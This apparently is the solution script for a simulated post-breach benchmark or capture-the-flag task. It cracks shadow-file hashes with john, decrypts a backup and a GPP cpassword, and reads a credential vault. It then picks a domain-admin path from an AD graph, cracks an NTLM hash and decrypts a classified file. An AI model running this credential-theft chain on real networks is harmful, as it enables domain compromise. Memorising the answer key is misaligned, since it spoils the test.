#!/bin/bash

# Install solution dependencies
pip3 install pycryptodome==3.21.0 -q

cd /app

echo "============================================"
echo "Stage 1: Crack shadow file hash (svc_backup)"
echo "============================================"

# Extract crackable shadow entries (skip locked/disabled accounts)
grep -v ':\!:' /app/enterprise/dmz-web01/etc_shadow | \
    grep -v ':\*:' | \
    grep '\$6\$' > /tmp/shadow_hashes.txt

# Use john with the provided wordlist
john --wordlist=/app/enterprise/dmz-web01/wordlist.txt /tmp/shadow_hashes.txt
SVC_BACKUP_PASS=$(john --show /tmp/shadow_hashes.txt | grep 'svc_backup' | cut -d: -f2)
echo "[+] svc_backup password: ${SVC_BACKUP_PASS}"

if [ -z "$SVC_BACKUP_PASS" ]; then
    echo "[-] Failed to crack svc_backup hash"
    exit 1
fi

echo ""
echo "============================================"
echo "Stage 2: Decrypt backup archive"
echo "============================================"

openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 \
    -in /app/enterprise/dmz-web01/backup.enc \
    -out /tmp/backup.tar.gz \
    -pass "pass:${SVC_BACKUP_PASS}"

mkdir -p /tmp/backup_content
tar xzf /tmp/backup.tar.gz -C /tmp/backup_content
echo "[+] Backup decrypted. Service notes:"
cat /tmp/backup_content/service_notes.txt

echo ""
echo "============================================"
echo "Stage 3: Decrypt GPP cpassword"
echo "============================================"

python3 /solution/gpp_decrypt.py \
    /app/enterprise/internal-app01/Policies/Groups.xml \
    /tmp/gpp_password.txt

GPP_PASS=$(cat /tmp/gpp_password.txt)
echo "[+] GPP password: ${GPP_PASS}"

if [ -z "$GPP_PASS" ]; then
    echo "[-] Failed to decrypt GPP cpassword"
    exit 1
fi

echo ""
echo "============================================"
echo "Stage 4: Decrypt credential vault"
echo "============================================"

openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 \
    -in /app/enterprise/internal-app01/vault.enc \
    -out /tmp/vault.txt \
    -pass "pass:${GPP_PASS}"

echo "[+] Vault contents:"
cat /tmp/vault.txt

echo ""
echo "============================================"
echo "Stage 5: Evaluate AD security graph"
echo "============================================"

mkdir -p /app/results

# Verify the AD graph file exists
if [ ! -f /app/enterprise/dc01/ad_graph.json ]; then
    echo "[-] AD graph file not found at /app/enterprise/dc01/ad_graph.json"
    echo "[-] Listing dc01 directory:"
    ls -la /app/enterprise/dc01/ 2>/dev/null || echo "[-] dc01 directory does not exist"
    exit 1
fi

python3 /solution/graph_analysis.py \
    /app/enterprise/dc01/ad_graph.json \
    /app/results/viable_path.json

# Extract the target account from the viable path
TARGET_ACCOUNT=$(python3 -c "import json; print(json.load(open('/app/results/viable_path.json'))[0])")
echo "[+] Target account with effective DA access: ${TARGET_ACCOUNT}"

echo ""
echo "============================================"
echo "Stage 6: Crack target account NTLM hash"
echo "============================================"

# Extract the target account's NTLM hash from the vault
TARGET_NTLM=$(grep "${TARGET_ACCOUNT}" /tmp/vault.txt | grep -oE '[a-f0-9]{32}')
echo "[+] ${TARGET_ACCOUNT} NTLM hash: ${TARGET_NTLM}"

# Crack NTLM hash
python3 /solution/ntlm_crack.py \
    "${TARGET_NTLM}" \
    /app/enterprise/dc01/cracking_wordlist.txt \
    /tmp/da_password.txt

DA_PASS=$(cat /tmp/da_password.txt)
echo "[+] Effective DA password: ${DA_PASS}"

if [ -z "$DA_PASS" ]; then
    echo "[-] Failed to crack ${TARGET_ACCOUNT} NTLM hash"
    exit 1
fi

echo "${DA_PASS}" > /app/results/da_password.txt

echo ""
echo "============================================"
echo "Stage 7: Decrypt classified document"
echo "============================================"

# Use the custom vault tool to decrypt classified.enc
python3 /solution/custom_decrypt.py \
    /app/enterprise/dc01/classified.enc \
    /app/results/decrypted_document.txt \
    "${DA_PASS}" \
    /app/enterprise/internal-app01/custom_vault/vault_config.ini

echo "[+] Results written:"
echo "[+] DA password: $(cat /app/results/da_password.txt)"
echo "[+] Viable path: $(cat /app/results/viable_path.json)"
echo "[+] Decrypted document: $(cat /app/results/decrypted_document.txt)"
echo ""
echo "[+] Post-breach assessment complete!"
